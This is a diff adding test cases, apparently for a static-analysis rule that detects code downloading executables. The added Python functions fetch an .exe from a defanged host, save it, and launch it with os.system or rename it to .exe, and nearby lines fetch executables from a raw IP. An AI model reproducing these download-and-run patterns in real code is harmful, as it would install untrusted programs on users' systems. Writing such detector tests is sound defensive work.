@@ -114,6 +114,27 @@ def f():
     open("exo.exe", "wb").write(response.content)
     os.system("set __COMPACT_LAYER=RunAsInvoker | start exo.exe")
 
+
+def f():
+    import os
+    import requests
+   
+    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
+    response = requests.get(URL)
+    # ok: download-executable
+    open("exo.txt", "wb").write(response.content)
+    os.system("set __COMPACT_LAYER=RunAsInvoker | start exo.exe")
+
+def f():
+    import os
+    import requests
+   
+    URL = "https://stub.syntheticcc[.]repl.co/exo.exe"
+    response = requests.get(URL)
+    # ok: download-executable
+    open("exo.txt", "wb").write(response.content)
+    os.system("mv exo.txt exo.exe")
+
 def f():
     for executable in all_executables:
         url = f'http://35.235.126[.]33/{executable}'
